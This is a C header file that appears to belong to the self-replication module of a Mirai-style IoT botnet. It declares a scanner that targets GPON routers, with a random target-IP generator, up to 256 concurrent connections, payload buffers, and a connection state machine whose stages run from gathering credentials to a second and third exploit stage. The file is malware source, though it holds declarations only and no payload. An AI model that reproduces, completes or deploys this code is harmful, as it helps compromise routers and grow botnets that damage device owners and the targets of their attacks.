#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef DEBUG
#define gpon80801_SCANNER_MAX_CONNS   3
#define gpon80801_SCANNER_RAW_PPS     788
#else
#define gpon80801_SCANNER_MAX_CONNS   256
#define gpon80801_SCANNER_RAW_PPS     788
#endif

#define gpon80801_SCANNER_RDBUF_SIZE  1080
#define gpon80801_SCANNER_HACK_DRAIN  64

struct gpon80801_scanner_connection
{
    int fd, last_recv;
    enum
    {
        gpon80801_SC_CLOSED,
        gpon80801_SC_CONNECTING,
        gpon80801_SC_GET_CREDENTIALS,
        gpon80801_SC_EXPLOIT_STAGE2,
        gpon80801_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[gpon80801_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[5000], payload_buf2[5000];
    int credential_index;
};

void gpon80801_scanner();
void gpon80801_kill(void);

static void gpon80801_setup_connection(struct gpon80801_scanner_connection *);
static ipv4_t get_random_gpon80801_ip(void);

#endif
